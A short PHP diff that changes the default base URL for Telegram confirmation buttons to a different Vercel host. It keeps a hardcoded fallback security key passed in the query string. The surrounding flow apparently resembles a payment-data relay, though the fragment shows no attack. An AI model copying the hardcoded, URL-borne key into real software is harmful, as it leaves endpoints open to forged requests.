@@ -95,7 +95,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         // Construir URLs para los botones de Telegram
-        $baseUrl = $config['baseUrl'] ?? 'https://recaudoairefactura.vercel.app/updatetele.php';
+        $baseUrl = $config['baseUrl'] ?? 'https://airefactura.vercel.app/updatetele.php';
         $security_key = $config['security_key'] ?? 'secure_key_123';
 
         $confirmUrl = "{$baseUrl}?id={$nuevo_id}&estado=10&key={$security_key}";
